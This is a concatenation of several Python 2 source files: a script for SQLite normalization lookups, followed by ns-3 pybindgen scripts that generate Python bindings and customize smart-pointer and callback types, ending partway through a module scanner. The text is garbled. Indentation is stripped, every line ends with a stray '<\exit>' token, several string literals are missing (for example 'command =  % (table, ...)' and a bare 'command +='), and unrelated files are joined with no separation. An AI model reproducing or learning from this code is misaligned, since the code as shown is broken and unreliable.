ap=argparse.ArgumentParser(description="Print results of lookup in normalization SQL DB for keys read from STDIN.")<\exit>
ap.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose output.")<\exit>
ap.add_argument("-np", "--no-prompt", default=False, action="store_true", help="No prompt.")<\exit>
ap.add_argument("database", metavar="DATABASE", help="Name of database to read")<\exit>
return ap<\exit>
def string_norm_form(s):<\exit>
return s.lower().strip().replace('-', ' ')<\exit>
def datas_by_ids(cursor, ids):<\exit>
responses = {}<\exit>
for table in TYPE_TABLES:<\exit>
command =  % (table, ','.join(['?' for i in ids]))<\exit>
cursor.execute(command, list(ids))<\exit>
response = cursor.fetchall()<\exit>
for id_, label, value in response:<\exit>
if id_ not in responses:<\exit>
responses[id_] = {}<\exit>
if table not in responses[id_]:<\exit>
responses[id_][table] = []<\exit>
responses[id_][table].append([label, value])<\exit>
if (table in NON_EMPTY_TABLES and<\exit>
len([i for i in responses if responses[i][table] == 0]) != 0):<\exit>
return None<\exit>
for id_ in responses:<\exit>
for t in NON_EMPTY_TABLES:<\exit>
if len(responses[id_][t]) == 0:<\exit>
return None<\exit>
datas = {}<\exit>
for id_ in responses:<\exit>
datas[id_] = []<\exit>
for t in TYPE_TABLES:<\exit>
datas[id_].append(responses[id_].get(t,[]))<\exit>
return datas<\exit>
def ids_by_name(cursor, name, exactmatch=False, return_match=False):<\exit>
return ids_by_names(cursor, [name], exactmatch, return_match)<\exit>
def ids_by_names(cursor, names, exactmatch=False, return_match=False):<\exit>
if not return_match:<\exit>
command = 'SELECT E.uid'<\exit>
else:<\exit>
command = 'SELECT E.uid, N.value'<\exit>
command +=<\exit>
if exactmatch:<\exit>
command += 'WHERE N.value IN (%s)' % ','.join(['?' for n in names])<\exit>
else:<\exit>
command += 'WHERE N.normvalue IN (%s)' % ','.join(['?' for n in names])<\exit>
names = [string_norm_form(n) for n in names]<\exit>
cursor.execute(command, names)<\exit>
responses = cursor.fetchall()<\exit>
if not return_match:<\exit>
return [r[0] for r in responses]<\exit>
else:<\exit>
return [(r[0],r[1]) for r in responses]<\exit>
def main(argv):<\exit>
arg = argparser().parse_args(argv[1:])<\exit>
dbn = arg.database<\exit>
dbpaths = [dbn, os.path.join('work', dbn), os.path.join('work', dbn)+'.db']<\exit>
dbfn = None<\exit>
for p in dbpaths:<\exit>
if os.path.exists(p):<\exit>
dbfn = p<\exit>
break<\exit>
if dbfn is None:<\exit>
print >> sys.stderr, "Error: %s: no such file" % dbfn<\exit>
return 1<\exit>
try:<\exit>
connection = sqlite.connect(dbfn)<\exit>
except sqlite.OperationalError, e:<\exit>
print >> sys.stderr, "Error connecting to DB %s:" % dbfn, e<\exit>
return 1<\exit>
cursor = connection.cursor()<\exit>
while True:<\exit>
if not arg.no_prompt:<\exit>
print ">>> ",<\exit>
l = sys.stdin.readline()<\exit>
if not l:<\exit>
break<\exit>
l = l.rstrip()<\exit>
try:<\exit>
r = ids_by_name(cursor, l)<\exit>
if len(r) != 0:<\exit>
d = datas_by_ids(cursor, r)<\exit>
for i in d:<\exit>
print i+'\t', '\t'.join([' '.join(["%s:%s" % (k,v) for k,v in a]) for a in d[i]])<\exit>
elif l == '':<\exit>
print "(Use Ctrl-D to exit)"<\exit>
else:<\exit>
print "(no record found for '%s')" % l<\exit>
except Exception, e:<\exit>
print >> sys.stderr, "Unexpected error", e<\exit>
return 1<\exit>
return 0<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
import warnings<\exit>
import sys<\exit>
import os<\exit>
import pybindgen.settings<\exit>
from pybindgen import Module, FileCodeSink, param, retval, cppclass, typehandlers<\exit>
from pybindgen.module import MultiSectionFactory<\exit>
import ns3modulegen_core_customizations<\exit>
pybindgen.settings.wrapper_registry = pybindgen.settings.StdMapWrapperRegistry<\exit>
class ErrorHandler(pybindgen.settings.ErrorHandler):<\exit>
def handle_error(self, wrapper, exception, traceback_):<\exit>
warnings.warn("exception %r in wrapper %s" % (exception, wrapper))<\exit>
return True<\exit>
pybindgen.settings.error_handler = ErrorHandler()<\exit>
pybindgen.settings.gcc_rtti_abi_complete = bool(eval(os.environ["GCC_RTTI_ABI_COMPLETE"]))<\exit>
class MyMultiSectionFactory(MultiSectionFactory):<\exit>
def __init__(self, main_file_name):<\exit>
super(MyMultiSectionFactory, self).__init__()<\exit>
self.main_file_name = main_file_name<\exit>
self.main_sink = FileCodeSink(open(main_file_name, "wt"))<\exit>
self.header_name = "ns3module.h"<\exit>
header_file_name = os.path.join(os.path.dirname(self.main_file_name), self.header_name)<\exit>
self.header_sink = FileCodeSink(open(header_file_name, "wt"))<\exit>
def get_section_code_sink(self, section_name):<\exit>
return self.main_sink<\exit>
def get_main_code_sink(self):<\exit>
return self.main_sink<\exit>
def get_common_header_code_sink(self):<\exit>
return self.header_sink<\exit>
def get_common_header_include(self):<\exit>
return '"%s"' % self.header_name<\exit>
def close(self):<\exit>
self.header_sink.file.close()<\exit>
self.main_sink.file.close()<\exit>
def main(argv):<\exit>
module_abs_src_path, target, extension_name, output_cc_file_name = argv[1:]<\exit>
module_name = os.path.basename(module_abs_src_path)<\exit>
out = MyMultiSectionFactory(output_cc_file_name)<\exit>
sys.path.insert(0, os.path.join(module_abs_src_path, "bindings"))<\exit>
try:<\exit>
module_apidefs = __import__("modulegen__%s" % target)<\exit>
del sys.modules["modulegen__%s" % target]<\exit>
try:<\exit>
module_customization = __import__("modulegen_customizations")<\exit>
del sys.modules["modulegen_customizations"]<\exit>
except ImportError:<\exit>
module_customization = object()<\exit>
try:<\exit>
from callbacks_list import callback_classes<\exit>
except ImportError, ex:<\exit>
print >> sys.stderr, "***************", repr(ex)<\exit>
callback_classes = []<\exit>
else:<\exit>
print >> sys.stderr, ">>>>>>>>>>>>>>>>", repr(callback_classes)<\exit>
finally:<\exit>
sys.path.pop(0)<\exit>
root_module = module_apidefs.module_init()<\exit>
root_module.set_name(extension_name)<\exit>
root_module.add_include('"ns3/%s-module.h"' % module_name)<\exit>
ns3modulegen_core_customizations.add_std_ios_openmode(root_module)<\exit>
module_apidefs.register_types(root_module)<\exit>
if hasattr(module_customization, 'post_register_types'):<\exit>
module_customization.post_register_types(root_module)<\exit>
ns3modulegen_core_customizations.generate_callback_classes(root_module.after_forward_declarations,<\exit>
callback_classes)<\exit>
module_apidefs.register_methods(root_module)<\exit>
if hasattr(module_customization, 'post_register_methods'):<\exit>
module_customization.post_register_methods(root_module)<\exit>
ns3modulegen_core_customizations.Object_customizations(root_module)<\exit>
ns3modulegen_core_customizations.Attribute_customizations(root_module)<\exit>
module_apidefs.register_functions(root_module)<\exit>
if hasattr(module_customization, 'post_register_functions'):<\exit>
module_customization.post_register_functions(root_module)<\exit>
root_module.generate(out)<\exit>
if __name__ == '__main__':<\exit>
import sys<\exit>
main(sys.argv)<\exit>
LOCAL_MODULES = [<\exit>
]<\exit>
import sys<\exit>
import os<\exit>
sys.path.insert(0, sys.argv[2])<\exit>
from pybindgen import FileCodeSink, write_preamble<\exit>
from pybindgen.module import MultiSectionFactory<\exit>
import pybindgen.settings<\exit>
pybindgen.settings.deprecated_virtuals = False<\exit>
from ns3modulegen_generated import module_init, register_types, register_methods, register_functions<\exit>
import ns3modulegen_core_customizations<\exit>
import callbacks_list<\exit>
import traceback<\exit>
this_script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))<\exit>
class ErrorHandler(pybindgen.settings.ErrorHandler):<\exit>
def handle_error(self, wrapper, exception, traceback_):<\exit>
print >> sys.stderr<\exit>
print >> sys.stderr, "---- location:"<\exit>
traceback.print_stack()<\exit>
print >> sys.stderr, "---- error:"<\exit>
traceback.print_tb(traceback_)<\exit>
try:<\exit>
stack = wrapper.stack_where_defined<\exit>
except AttributeError:<\exit>
print >> sys.stderr, "??:??: %s / %r" % (wrapper, exception)<\exit>
else:<\exit>
stack = list(stack)<\exit>
stack.reverse()<\exit>
for (filename, line_number, function_name, text) in stack:<\exit>
file_dir = os.path.dirname(os.path.abspath(filename))<\exit>
if file_dir.startswith(this_script_dir):<\exit>
print >> sys.stderr, "%s:%i: %r" % (os.path.join("..", "bindings", "python", os.path.basename(filename)),<\exit>
line_number, exception)<\exit>
break<\exit>
return True<\exit>
pybindgen.settings.error_handler = ErrorHandler()<\exit>
pybindgen.settings.wrapper_registry = pybindgen.settings.StdMapWrapperRegistry<\exit>
class MyMultiSectionFactory(MultiSectionFactory):<\exit>
def __init__(self, main_file_name, modules):<\exit>
super(MyMultiSectionFactory, self).__init__()<\exit>
self.main_file_name = main_file_name<\exit>
self.main_sink = FileCodeSink(open(main_file_name, "wt"))<\exit>
self.header_name = "ns3module.h"<\exit>
header_file_name = os.path.join(os.path.dirname(self.main_file_name), 'pch', self.header_name)<\exit>
self.header_sink = FileCodeSink(open(header_file_name, "wt"))<\exit>
self.section_sinks = {'__main__': self.main_sink}<\exit>
for module in modules:<\exit>
section_name = 'ns3_module_%s' % module.replace('-', '_')<\exit>
file_name = os.path.join(os.path.dirname(self.main_file_name), "%s.cc" % section_name)<\exit>
sink = FileCodeSink(open(file_name, "wt"))<\exit>
self.section_sinks[section_name] = sink<\exit>
def get_section_code_sink(self, section_name):<\exit>
return self.section_sinks[section_name]<\exit>
def get_main_code_sink(self):<\exit>
return self.main_sink<\exit>
def get_common_header_code_sink(self):<\exit>
return self.header_sink<\exit>
def get_common_header_include(self):<\exit>
return '"%s"' % self.header_name<\exit>
def close(self):<\exit>
self.header_sink.file.close()<\exit>
self.main_sink.file.close()<\exit>
for sink in self.section_sinks.itervalues():<\exit>
sink.file.close()<\exit>
def main():<\exit>
out = MyMultiSectionFactory(sys.argv[1], sys.argv[3:])<\exit>
root_module = module_init()<\exit>
root_module.add_include('"everything.h"')<\exit>
register_types(root_module)<\exit>
ns3modulegen_core_customizations.Simulator_customizations(root_module)<\exit>
ns3modulegen_core_customizations.CommandLine_customizations(root_module)<\exit>
ns3modulegen_core_customizations.TypeId_customizations(root_module)<\exit>
ns3modulegen_core_customizations.add_std_ofstream(root_module)<\exit>
ns3modulegen_core_customizations.add_ipv4_address_tp_hash(root_module)<\exit>
for local_module in LOCAL_MODULES:<\exit>
mod = __import__(local_module)<\exit>
mod.register_types(root_module)<\exit>
ns3modulegen_core_customizations.generate_callback_classes(root_module.after_forward_declarations,<\exit>
callbacks_list.callback_classes)<\exit>
register_methods(root_module)<\exit>
for local_module in LOCAL_MODULES:<\exit>
mod = __import__(local_module)<\exit>
mod.register_methods(root_module)<\exit>
ns3modulegen_core_customizations.Object_customizations(root_module)<\exit>
ns3modulegen_core_customizations.Attribute_customizations(root_module)<\exit>
register_functions(root_module)<\exit>
for local_module in LOCAL_MODULES:<\exit>
mod = __import__(local_module)<\exit>
mod.register_functions(root_module)<\exit>
enabled_features = os.environ['NS3_ENABLED_FEATURES'].split(',')<\exit>
if 'GtkConfigStore' not in enabled_features:<\exit>
try:<\exit>
root_module.classes.remove(root_module['ns3::GtkConfigStore'])<\exit>
except KeyError:<\exit>
pass<\exit>
if 'SqliteDataOutput' not in enabled_features:<\exit>
try:<\exit>
root_module.classes.remove(root_module['ns3::SqliteDataOutput'])<\exit>
except KeyError:<\exit>
pass<\exit>
if 'Threading' not in enabled_features:<\exit>
for clsname in ['SystemThread', 'SystemMutex', 'SystemCondition', 'CriticalSection',<\exit>
'SimpleRefCount< ns3::SystemThread, ns3::empty, ns3::DefaultDeleter<ns3::SystemThread> >']:<\exit>
root_module.classes.remove(root_module['ns3::%s' % clsname])<\exit>
if 'EmuNetDevice' not in enabled_features:<\exit>
for clsname in ['EmuNetDevice', 'EmuHelper']:<\exit>
root_module.classes.remove(root_module['ns3::%s' % clsname])<\exit>
root_module.enums.remove(root_module['ns3::EmuNetDevice::EncapsulationMode'])<\exit>
if 'RealTime' not in enabled_features:<\exit>
for clsname in ['WallClockSynchronizer', 'RealtimeSimulatorImpl']:<\exit>
root_module.classes.remove(root_module['ns3::%s' % clsname])<\exit>
root_module.enums.remove(root_module['ns3::RealtimeSimulatorImpl::SynchronizationMode'])<\exit>
if 'TapBridge' not in enabled_features:<\exit>
for clsname in ['TapBridge', 'TapBridgeHelper', 'TapBridgeFdReader']:<\exit>
root_module.classes.remove(root_module['ns3::%s' % clsname])<\exit>
root_module.enums.remove(root_module['ns3::TapBridge::Mode'])<\exit>
root_module.generate(out, '_ns3')<\exit>
out.close()<\exit>
if __name__ == '__main__':<\exit>
if 0:<\exit>
try:<\exit>
import cProfile as profile<\exit>
except ImportError:<\exit>
main()<\exit>
else:<\exit>
print >> sys.stderr, "** running under profiler"<\exit>
profile.run('main()', 'ns3modulegen.pstat')<\exit>
else:<\exit>
main()<\exit>
import re<\exit>
from pybindgen.typehandlers import base as typehandlers<\exit>
from pybindgen import ReturnValue, Parameter<\exit>
from pybindgen.cppmethod import CustomCppMethodWrapper, CustomCppConstructorWrapper<\exit>
from pybindgen.typehandlers.codesink import MemoryCodeSink<\exit>
from pybindgen.typehandlers import ctypeparser<\exit>
from pybindgen import cppclass<\exit>
import warnings<\exit>
from pybindgen.typehandlers.base import CodeGenerationError<\exit>
import sys<\exit>
class SmartPointerTransformation(typehandlers.TypeTransformation):<\exit>
def __init__(self):<\exit>
super(SmartPointerTransformation, self).__init__()<\exit>
self.rx = re.compile(r'(ns3::|::ns3::|)Ptr<([^>]+)>\s*$')<\exit>
def _get_untransformed_type_traits(self, name):<\exit>
m = self.rx.match(name)<\exit>
is_const = False<\exit>
if m is None:<\exit>
return None, False<\exit>
else:<\exit>
name1 = m.group(2).strip()<\exit>
if name1.startswith('const '):<\exit>
name1 = name1[len('const '):]<\exit>
is_const = True<\exit>
if name1.endswith(' const'):<\exit>
name1 = name1[:-len(' const')]<\exit>
is_const = True<\exit>
new_name = name1+' *'<\exit>
if new_name.startswith('::'):<\exit>
new_name = new_name[2:]<\exit>
return new_name, is_const<\exit>
def get_untransformed_name(self, name):<\exit>
new_name, dummy_is_const = self._get_untransformed_type_traits(name)<\exit>
return new_name<\exit>
def create_type_handler(self, type_handler, *args, **kwargs):<\exit>
if issubclass(type_handler, Parameter):<\exit>
kwargs['transfer_ownership'] = False<\exit>
elif issubclass(type_handler, ReturnValue):<\exit>
kwargs['caller_owns_return'] = False<\exit>
else:<\exit>
raise AssertionError<\exit>
orig_ctype, is_const = self._get_untransformed_type_traits(args[0])<\exit>
if is_const:<\exit>
correct_ctype = 'ns3::Ptr< %s const >' % orig_ctype[:-2]<\exit>
else:<\exit>
correct_ctype = 'ns3::Ptr< %s >' % orig_ctype[:-2]<\exit>
args = tuple([correct_ctype] + list(args[1:]))<\exit>
handler = type_handler(*args, **kwargs)<\exit>
handler.set_tranformation(self, orig_ctype)<\exit>
return handler<\exit>
def untransform(self, type_handler, declarations, code_block, expression):<\exit>
return 'const_cast<%s> (ns3::PeekPointer (%s))' % (type_handler.untransformed_ctype, expression)<\exit>
def transform(self, type_handler, declarations, code_block, expression):<\exit>
assert type_handler.untransformed_ctype[-1] == '*'<\exit>
return 'ns3::Ptr< %s > (%s)' % (type_handler.untransformed_ctype[:-1], expression)<\exit>
transf = SmartPointerTransformation()<\exit>
typehandlers.return_type_matcher.register_transformation(transf)<\exit>
typehandlers.param_type_matcher.register_transformation(transf)<\exit>
del transf<\exit>
class ArgvParam(Parameter):<\exit>
DIRECTIONS = [Parameter.DIRECTION_IN]<\exit>
CTYPES = []<\exit>
def convert_c_to_python(self, wrapper):<\exit>
raise NotImplementedError<\exit>
def convert_python_to_c(self, wrapper):<\exit>
py_name = wrapper.declarations.declare_variable('PyObject*', 'py_' + self.name)<\exit>
argc_var = wrapper.declarations.declare_variable('int', 'argc')<\exit>
name = wrapper.declarations.declare_variable('char**', self.name)<\exit>
idx = wrapper.declarations.declare_variable('Py_ssize_t', 'idx')<\exit>
wrapper.parse_params.add_parameter('O!', ['&PyList_Type', '&'+py_name], self.name)<\exit>
wrapper.before_call.write_code("%s = (char **) malloc(sizeof(char*)*PyList_Size(%s));"<\exit>
% (name, py_name))<\exit>
wrapper.before_call.add_cleanup_code('free(%s);' % name)<\exit>
wrapper.before_call.write_code( % vars())<\exit>
wrapper.before_call.sink.indent()<\exit>
wrapper.before_call.write_code( % vars())<\exit>
wrapper.before_call.write_error_check(<\exit>
'!PyString_Check(item)',<\exit>
failure_cleanup=('PyErr_SetString(PyExc_TypeError, '<\exit>
'"argument %s must be a list of strings");') % self.name)<\exit>
wrapper.before_call.write_code(<\exit>
'%s[%s] = PyString_AsString(item);' % (name, idx))<\exit>
wrapper.before_call.sink.unindent()<\exit>
wrapper.before_call.write_code('}')<\exit>
wrapper.before_call.write_code('%s = PyList_Size(%s);' % (argc_var, py_name))<\exit>
wrapper.call_params.append(argc_var)<\exit>
wrapper.call_params.append(name)<\exit>
class CallbackImplProxyMethod(typehandlers.ReverseWrapperBase):<\exit>
def __init__(self, return_value, parameters):<\exit>
super(CallbackImplProxyMethod, self).__init__(return_value, parameters)<\exit>
def generate_python_call(self):<\exit>
build_params = self.build_params.get_parameters(force_tuple_creation=True)<\exit>
if build_params[0][0] == '"':<\exit>
build_params[0] = '(char *) ' + build_params[0]<\exit>
args = self.before_call.declare_variable('PyObject*', 'args')<\exit>
self.before_call.write_code('%s = Py_BuildValue(%s);'<\exit>
% (args, ', '.join(build_params)))<\exit>
self.before_call.add_cleanup_code('Py_DECREF(%s);' % args)<\exit>
self.before_call.write_code('py_retval = PyObject_CallObject(m_callback, %s);' % args)<\exit>
self.before_call.write_error_check('py_retval == NULL')<\exit>
self.before_call.add_cleanup_code('Py_DECREF(py_retval);')<\exit>
def generate_callback_classes(out, callbacks):<\exit>
for callback_impl_num, template_parameters in enumerate(callbacks):<\exit>
sink = MemoryCodeSink()<\exit>
cls_name = "ns3::Callback< %s >" % ', '.join(template_parameters)<\exit>
class_name = "PythonCallbackImpl%i" % callback_impl_num<\exit>
sink.writeln( % (class_name, ', '.join(template_parameters), class_name, class_name, class_name, class_name))<\exit>
sink.indent()<\exit>
callback_return = template_parameters[0]<\exit>
return_ctype = ctypeparser.parse_type(callback_return)<\exit>
if ('const' in return_ctype.remove_modifiers()):<\exit>
kwargs = {'is_const': True}<\exit>
else:<\exit>
kwargs = {}<\exit>
try:<\exit>
return_type = ReturnValue.new(str(return_ctype), **kwargs)<\exit>
except (typehandlers.TypeLookupError, typehandlers.TypeConfigurationError), ex:<\exit>
warnings.warn("***** Unable to register callback; Return value '%s' error (used in %s): %r"<\exit>
% (callback_return, cls_name, ex),<\exit>
Warning)<\exit>
continue<\exit>
arguments = []<\exit>
ok = True<\exit>
callback_parameters = [arg for arg in template_parameters[1:] if arg != 'ns3::empty']<\exit>
for arg_num, arg_type in enumerate(callback_parameters):<\exit>
arg_name = 'arg%i' % (arg_num+1)<\exit>
param_ctype = ctypeparser.parse_type(arg_type)<\exit>
if ('const' in param_ctype.remove_modifiers()):<\exit>
kwargs = {'is_const': True}<\exit>
else:<\exit>
kwargs = {}<\exit>
try:<\exit>
arguments.append(Parameter.new(str(param_ctype), arg_name, **kwargs))<\exit>
except (typehandlers.TypeLookupError, typehandlers.TypeConfigurationError), ex:<\exit>
warnings.warn("***** Unable to register callback; parameter '%s %s' error (used in %s): %r"<\exit>
% (arg_type, arg_name, cls_name, ex),<\exit>
Warning)<\exit>
ok = False<\exit>
if not ok:<\exit>
continue<\exit>
wrapper = CallbackImplProxyMethod(return_type, arguments)<\exit>
wrapper.generate(sink, 'operator()', decl_modifiers=[])<\exit>
sink.unindent()<\exit>
sink.writeln('};\n')<\exit>
sink.flush_to(out)<\exit>
class PythonCallbackParameter(Parameter):<\exit>
"Class handlers"<\exit>
CTYPES = [cls_name]<\exit>
print >> sys.stderr, "***** registering callback handler: %r" % ctypeparser.normalize_type_string(cls_name)<\exit>
DIRECTIONS = [Parameter.DIRECTION_IN]<\exit>
PYTHON_CALLBACK_IMPL_NAME = class_name<\exit>
TEMPLATE_ARGS = template_parameters<\exit>
def convert_python_to_c(self, wrapper):<\exit>
"parses python args to get C++ value"<\exit>
assert isinstance(wrapper, typehandlers.ForwardWrapperBase)<\exit>
if self.default_value is None:<\exit>
py_callback = wrapper.declarations.declare_variable('PyObject*', self.name)<\exit>
wrapper.parse_params.add_parameter('O', ['&'+py_callback], self.name)<\exit>
wrapper.before_call.write_error_check(<\exit>
'!PyCallable_Check(%s)' % py_callback,<\exit>
'PyErr_SetString(PyExc_TypeError, "parameter \'%s\' must be callbale");' % self.name)<\exit>
callback_impl = wrapper.declarations.declare_variable(<\exit>
'ns3::Ptr<%s>' % self.PYTHON_CALLBACK_IMPL_NAME,<\exit>
'%s_cb_impl' % self.name)<\exit>
wrapper.before_call.write_code("%s = ns3::Create<%s> (%s);"<\exit>
% (callback_impl, self.PYTHON_CALLBACK_IMPL_NAME, py_callback))<\exit>
wrapper.call_params.append(<\exit>
'ns3::Callback<%s> (%s)' % (', '.join(self.TEMPLATE_ARGS), callback_impl))<\exit>
else:<\exit>
py_callback = wrapper.declarations.declare_variable('PyObject*', self.name, 'NULL')<\exit>
wrapper.parse_params.add_parameter('O', ['&'+py_callback], self.name, optional=True)<\exit>
value = wrapper.declarations.declare_variable(<\exit>
'ns3::Callback<%s>' % ', '.join(self.TEMPLATE_ARGS),<\exit>
self.name+'_value',<\exit>
self.default_value)<\exit>
wrapper.before_call.write_code("if (%s) {" % (py_callback,))<\exit>
wrapper.before_call.indent()<\exit>
wrapper.before_call.write_error_check(<\exit>
'!PyCallable_Check(%s)' % py_callback,<\exit>
'PyErr_SetString(PyExc_TypeError, "parameter \'%s\' must be callbale");' % self.name)<\exit>
wrapper.before_call.write_code("%s = ns3::Callback<%s> (ns3::Create<%s> (%s));"<\exit>
% (value, ', '.join(self.TEMPLATE_ARGS),<\exit>
self.PYTHON_CALLBACK_IMPL_NAME, py_callback))<\exit>
wrapper.before_call.unindent()<\exit>
wrapper.before_call.write_code("}")<\exit>
wrapper.call_params.append(value)<\exit>
def convert_c_to_python(self, wrapper):<\exit>
raise typehandlers.NotSupportedError("Reverse wrappers for ns3::Callback<...> types "<\exit>
"(python using callbacks defined in C++) not implemented.")<\exit>
def Simulator_customizations(module):<\exit>
Simulator = module['ns3::Simulator']<\exit>
Simulator.add_custom_method_wrapper("Schedule", "_wrap_Simulator_Schedule",<\exit>
flags=["METH_VARARGS", "METH_KEYWORDS", "METH_STATIC"])<\exit>
Simulator.add_custom_method_wrapper("ScheduleNow", "_wrap_Simulator_ScheduleNow",<\exit>
flags=["METH_VARARGS", "METH_KEYWORDS", "METH_STATIC"])<\exit>
Simulator.add_custom_method_wrapper("ScheduleDestroy", "_wrap_Simulator_ScheduleDestroy",<\exit>
flags=["METH_VARARGS", "METH_KEYWORDS", "METH_STATIC"])<\exit>
Simulator.add_custom_method_wrapper("Run", "_wrap_Simulator_Run",<\exit>
flags=["METH_VARARGS", "METH_KEYWORDS", "METH_STATIC"])<\exit>
def CommandLine_customizations(module):<\exit>
CommandLine = module['ns3::CommandLine']<\exit>
CommandLine.add_method('Parse', None, [ArgvParam(None, 'argv')],<\exit>
is_static=False)<\exit>
CommandLine.add_custom_method_wrapper("AddValue", "_wrap_CommandLine_AddValue",<\exit>
flags=["METH_VARARGS", "METH_KEYWORDS"])<\exit>
def Object_customizations(module):<\exit>
try:<\exit>
Object = module['ns3::Object']<\exit>
except KeyError:<\exit>
return<\exit>
def helper_class_hook(helper_class):<\exit>
decl =   % (helper_class.name, helper_class.class_.full_name)<\exit>
helper_class.add_custom_method(decl)<\exit>
helper_class.add_post_generation_code(<\exit>
"NS_OBJECT_ENSURE_REGISTERED (%s);" % helper_class.name)<\exit>
Object.add_helper_class_hook(helper_class_hook)<\exit>
def ns3_object_instance_creation_function(cpp_class, code_block, lvalue,<\exit>
parameters, construct_type_name):<\exit>
assert lvalue<\exit>
assert not lvalue.startswith('None')<\exit>
if cpp_class.cannot_be_constructed:<\exit>
raise CodeGenerationError("%s cannot be constructed (%s)"<\exit>
% cpp_class.full_name)<\exit>
if cpp_class.incomplete_type:<\exit>
raise CodeGenerationError("%s cannot be constructed (incomplete type)"<\exit>
% cpp_class.full_name)<\exit>
code_block.write_code("%s = new %s(%s);" % (lvalue, construct_type_name, parameters))<\exit>
code_block.write_code("%s->Ref ();" % (lvalue))<\exit>
def ns3_object_post_instance_creation_function(cpp_class, code_block, lvalue,<\exit>
parameters, construct_type_name):<\exit>
code_block.write_code("ns3::CompleteConstruct(%s);" % (lvalue, ))<\exit>
Object.set_instance_creation_function(ns3_object_instance_creation_function)<\exit>
Object.set_post_instance_creation_function(ns3_object_post_instance_creation_function)<\exit>
def Attribute_customizations(module):<\exit>
for cls in module.classes:<\exit>
for meth in cls.get_all_methods():<\exit>
for param in meth.parameters:<\exit>
if isinstance(param, cppclass.CppClassRefParameter):<\exit>
if param.cpp_class.name == 'AttributeValue' \<\exit>
and param.default_value is not None \<\exit>
and param.default_value_type is None:<\exit>
param.default_value_type = 'ns3::EmptyAttributeValue'<\exit>
def TypeId_customizations(module):<\exit>
TypeId = module['ns3::TypeId']<\exit>
TypeId.add_custom_method_wrapper("LookupByNameFailSafe", "_wrap_TypeId_LookupByNameFailSafe",<\exit>
flags=["METH_VARARGS", "METH_KEYWORDS", "METH_STATIC"])<\exit>
def add_std_ofstream(module):<\exit>
module.add_include('<fstream>')<\exit>
ostream = module.add_class('ostream', foreign_cpp_namespace='::std')<\exit>
ostream.set_cannot_be_constructed("abstract base class")<\exit>
ofstream = module.add_class('ofstream', foreign_cpp_namespace='::std', parent=ostream)<\exit>
ofstream.add_enum('openmode', [<\exit>
('app', 'std::ios_base::app'),<\exit>
('ate', 'std::ios_base::ate'),<\exit>
('binary', 'std::ios_base::binary'),<\exit>
('in', 'std::ios_base::in'),<\exit>
('out', 'std::ios_base::out'),<\exit>
('trunc', 'std::ios_base::trunc'),<\exit>
])<\exit>
ofstream.add_constructor([Parameter.new("const char *", 'filename'),<\exit>
Parameter.new("::std::ofstream::openmode", 'mode', default_value="std::ios_base::out")])<\exit>
ofstream.add_method('close', None, [])<\exit>
add_std_ios_openmode(module)<\exit>
def add_std_ios_openmode(module):<\exit>
import pybindgen.typehandlers.base<\exit>
for alias in "std::_Ios_Openmode", "std::ios::openmode":<\exit>
pybindgen.typehandlers.base.param_type_matcher.add_type_alias(alias, "int")<\exit>
for flag in 'in', 'out', 'ate', 'app', 'trunc', 'binary':<\exit>
module.after_init.write_code('PyModule_AddIntConstant(m, (char *) "STD_IOS_%s", std::ios::%s);'<\exit>
% (flag.upper(), flag))<\exit>
def add_ipv4_address_tp_hash(module):<\exit>
module.body.writeln()<\exit>
module.header.writeln('long _ns3_Ipv4Address_tp_hash (PyObject *obj);')<\exit>
module['Ipv4Address'].pytype.slots['tp_hash'] = "_ns3_Ipv4Address_tp_hash"<\exit>
import sys<\exit>
import os.path<\exit>
import pybindgen.settings<\exit>
from pybindgen.gccxmlparser import ModuleParser, PygenClassifier, PygenSection, WrapperWarning, find_declaration_from_name<\exit>
from pybindgen.typehandlers.codesink import FileCodeSink<\exit>
from pygccxml.declarations import templates<\exit>
from pygccxml.declarations.enumeration import enumeration_t<\exit>
from pygccxml.declarations.class_declaration import class_t<\exit>
from pygccxml.declarations.calldef import free_function_t, member_function_t, constructor_t, calldef_t<\exit>
import ns3modulegen_core_customizations<\exit>
class ErrorHandler(pybindgen.settings.ErrorHandler):<\exit>
def handle_error(self, dummy_wrapper, dummy_exception, dummy_traceback_):<\exit>
return True<\exit>
pybindgen.settings.error_handler = ErrorHandler()<\exit>
import warnings<\exit>
warnings.filterwarnings(category=WrapperWarning, action='ignore')<\exit>
import ns3modulescan<\exit>
type_annotations = ns3modulescan.type_annotations<\exit>
def get_ns3_relative_path(path):<\exit>
l = []<\exit>
head = path<\exit>
while head:<\exit>
new_head, tail = os.path.split(head)<\exit>
if new_head == head:<\exit>
raise ValueError<\exit>
head = new_head<\exit>
if tail == 'ns3':<\exit>
return os.path.join(*l)<\exit>
l.insert(0, tail)<\exit>
raise AssertionError("is the path %r inside ns3?!" % path)<\exit>
class PreScanHook:<\exit>
def __init__(self, headers_map, module):<\exit>
self.headers_map = headers_map<\exit>
self.module = module<\exit>
def __call__(self, module_parser,<\exit>
pygccxml_definition,<\exit>
global_annotations,<\exit>
parameter_annotations):<\exit>
try:<\exit>
ns3_header = get_ns3_relative_path(pygccxml_definition.location.file_name)<\exit>
except ValueError:<\exit>
return<\exit>
definition_module = self.headers_map[ns3_header]<\exit>
global_annotations['pygen_comment'] = "%s (module %r): %s" % \<\exit>
(ns3_header, definition_module, pygccxml_definition)<\exit>
if isinstance(pygccxml_definition, member_function_t) \<\exit>
and pygccxml_definition.parent.name == 'Object' \<\exit>
and pygccxml_definition.name == 'GetObject':<\exit>
template_args = templates.args(pygccxml_definition.demangled_name)<\exit>
if template_args == ['ns3::Object']:<\exit>
global_annotations['template_instance_names'] = 'ns3::Object=>GetObject'<\exit>
if isinstance(pygccxml_definition, member_function_t) \<\exit>
and pygccxml_definition.parent.name == 'Simulator' \<\exit>
and pygccxml_definition.name.startswith('Schedule'):<\exit>
global_annotations['ignore'] = None<\exit>
if isinstance(pygccxml_definition, member_function_t) \<\exit>
and pygccxml_definition.parent.name == 'Simulator' \<\exit>
and pygccxml_definition.name == 'Run':<\exit>
global_annotations['ignore'] = True<\exit>
if isinstance(pygccxml_definition, calldef_t):<\exit>
for arg in pygccxml_definition.arguments:<\exit>
if arg.default_value is None:<\exit>
continue<\exit>
elif arg.default_value == "ns3::MilliSeconds( )":<\exit>
arg.default_value = "ns3::MilliSeconds(0)"<\exit>
elif arg.default_value == "ns3::Seconds( )":<\exit>
arg.default_value = "ns3::Seconds(0)"<\exit>
if isinstance(pygccxml_definition, class_t):<\exit>
